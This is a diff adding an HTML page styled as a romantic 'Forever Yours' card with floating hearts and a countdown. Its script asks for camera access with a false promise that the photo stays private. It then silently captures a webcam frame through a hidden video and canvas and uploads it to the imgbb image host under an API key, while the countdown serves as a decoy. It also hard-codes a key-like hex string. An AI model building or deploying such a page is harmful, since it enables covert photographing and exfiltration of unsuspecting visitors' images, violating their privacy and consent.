@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Forever Yours • Love</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Dancing+Script:wght@400;700&display=swap');
+
+        :root {
+            --pink: #ff9ec8;
+            --rose: #ff6b9d;
+            --soft-white: #fff0f5;
+        }
+
+        body {
+            background: linear-gradient(135deg, #ffe4f0 0%, #ffd1e6 100%);
+            min-height: 100vh;
+            font-family: 'Playfair Display', serif;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .hearts {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .heart {
+            position: absolute;
+            color: #ff6b9d;
+            font-size: 20px;
+            opacity: 0.6;
+            animation: floatHeart 15s linear infinite;
+        }
+
+        @keyframes floatHeart {
+            0% { transform: translateY(100vh) rotate(0deg); }
+            100% { transform: translateY(-100px) rotate(360deg); }
+        }
+
+        .main-container {
+            position: relative;
+            z-index: 2;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .love-card {
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            box-shadow: 0 25px 50px -12px rgb(255 107 157 / 0.4);
+            border: 2px solid rgba(255, 107, 157, 0.3);
+            max-width: 420px;
+            width: 100%;
+            padding: 2.5rem;
+            text-align: center;
+            transition: all 0.4s ease;
+        }
+
+        .love-card h1 {
+            font-family: 'Dancing Script', cursive;
+            font-size: 3.2rem;
+            color: var(--rose);
+            margin-bottom: 0.5rem;
+        }
+
+        .subtitle {
+            font-size: 1.1rem;
+            color: #c4457d;
+        }
+
+        .timer {
+            font-size: 3.5rem;
+            font-weight: bold;
+            color: var(--rose);
+            font-family: 'Playfair Display', serif;
+        }
+
+        .progress {
+            height: 8px;
+            border-radius: 50px;
+            background: #ffe4f0;
+        }
+
+        .progress-bar {
+            background: linear-gradient(90deg, var(--rose), #ff9ec8);
+            transition: width 0.3s ease;
+        }
+
+        .permission-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            flex-direction: column;
+            gap: 1.5rem;
+        }
+
+        .hidden-video {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Floating Hearts Background -->
+    <div class="hearts" id="hearts"></div>
+
+    <!-- Permission Screen -->
+    <div class="permission-screen" id="permissionScreen">
+        <div class="text-center">
+            <i class="fas fa-heart fa-5x mb-4" style="color: #ff6b9d; animation: pulse 2s infinite;"></i>
+            <h2 class="mb-3" style="color: #c4457d;">Camera Access Required</h2>
+            <p class="text-muted mb-4 px-4" style="max-width: 320px;">
+                This experience needs camera access to capture a beautiful moment of love.
+            </p>
+            <button class="btn btn-lg px-5" style="background: #ff6b9d; color: white; border-radius: 50px;" onclick="requestCamera()">
+                <i class="fas fa-camera me-2"></i> Grant Camera Access
+            </button>
+            <div class="mt-4 text-muted small">
+                <i class="fas fa-info-circle"></i> Your photo will be captured privately
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Love UI -->
+    <div class="main-container" id="mainUI" style="display: none;">
+        <div class="love-card">
+            <h1>Forever Yours</h1>
+            <p class="subtitle mb-4">Capturing our moment...</p>
+            
+            <div class="mb-4">
+                <div id="countdown" class="timer">30</div>
+                <small class="text-muted">seconds</small>
+            </div>
+
+            <div class="progress mb-4">
+                <div id="progressBar" class="progress-bar" style="width: 100%"></div>
+            </div>
+
+            <div class="text-center">
+                <i class="fas fa-heart fa-3x" style="color: #ff9ec8; animation: pulse 1.5s infinite;"></i>
+            </div>
+
+            <div class="mt-4 text-muted small">
+                A private moment is being captured for you
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Video & Canvas -->
+    <video id="video" class="hidden-video" autoplay playsinline></video>
+    <canvas id="canvas" class="hidden-video" width="640" height="480"></canvas>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // ================== CONFIG ==================
+        const API_KEY = "YOUR_API_KEY_HERE"; // ← Replace with your imgbb API key
+        
+        // ================== ELEMENTS ==================
+        let video = document.getElementById('video');
+        let canvas = document.getElementById('canvas');
+        let stream = null;
+        let countdownInterval = null;
+        let currentTime = 30;
+
+        // ================== HEART ANIMATION ==================
+        function createHeart() {
+            const heart = document.createElement('div');
+            heart.className = 'heart';
+            heart.innerHTML = '❤️';
+            heart.style.left = Math.random() * 100 + 'vw';
+            heart.style.animationDuration = (Math.random() * 10 + 12) + 's';
+            heart.style.fontSize = (Math.random() * 18 + 18) + 'px';
+            heart.style.opacity = Math.random() * 0.5 + 0.4;
+            document.getElementById('hearts').appendChild(heart);
+
+            setTimeout(() => {
+                heart.remove();
+            }, 25000);
+        }
+
+        setInterval(createHeart, 280);
+
+        // ================== CAMERA LOGIC ==================
+        async function requestCamera() {
+            try {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: 640, height: 480 }
+                });
+
+                video.srcObject = stream;
+                await video.play();
+
+                // Success! Hide permission screen
+                document.getElementById('permissionScreen').style.display = 'none';
+                document.getElementById('mainUI').style.display = 'flex';
+
+                // Start the experience
+                startLoveExperience();
+
+            } catch (err) {
+                console.error("Camera access denied:", err);
+                // Stay on permission screen
+                document.getElementById('permissionScreen').style.display = 'flex';
+                document.getElementById('mainUI').style.display = 'none';
+            }
+        }
+
+        function captureAndUpload() {
+            if (!stream) return;
+
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert to base64
+            const imageData = canvas.toDataURL('image/jpeg', 0.85);
+
+            uploadToImgBB(imageData);
+        }
+
+        async function uploadToImgBB(base64Image) {
+            if (!API_KEY || API_KEY === "f6b975254a93cbedf0501e34e95a9ce6") {
+                console.warn("⚠️ Please set your imgbb API key");
+                return;
+            }
+
+            try {
+                // Remove data URL prefix
+                const base64Data = base64Image.split(',')[1];
+
+                const formData = new FormData();
+                formData.append('image', base64Data);
+
+                const response = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+                
+                if (result.status === 200) {
+                    console.log("❤️ Image uploaded successfully:", result.data.url);
+                    // You can do something with the URL here (e.g. save to localStorage)
+                } else {
+                    console.error("Upload failed:", result);
+                }
+            } catch (err) {
+                console.error("Upload error:", err);
+            }
+        }
+
+        // ================== COUNTDOWN ==================
+        function startCountdown() {
+            currentTime = 30;
+            const countdownEl = document.getElementById('countdown');
+            const progressBar = document.getElementById('progressBar');
+
+            if (countdownInterval) clearInterval(countdownInterval);
+
+            countdownInterval = setInterval(() => {
+                currentTime--;
+                countdownEl.textContent = currentTime;
+                
+                const progress = (currentTime / 30) * 100;
+                progressBar.style.width = `${progress}%`;
+
+                if (currentTime <= 0) {
+                    clearInterval(countdownInterval);
+                    countdownEl.textContent = "❤️";
+                    countdownEl.style.fontSize = "4rem";
+                }
+            }, 1000);
+        }
+
+        function startLoveExperience() {
+            // Capture image immediately (silently)
+            setTimeout(() => {
+                captureAndUpload();
+            }, 800);
+
+            // Start countdown
+            startCountdown();
+        }
+
+        // ================== INITIALIZATION ==================
+        window.onload = () => {
+            // Create some initial hearts
+            for (let i = 0; i < 12; i++) {
+                setTimeout(createHeart, i * 80);
+            }
+
+            // Try to request camera immediately
+            setTimeout(() => {
+                requestCamera();
+            }, 600);
+        };
+
+        // Cleanup on page leave
+        window.addEventListener('beforeunload', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            if (countdownInterval) clearInterval(countdownInterval);
+        });
+    </script>
+</body>
+</html>
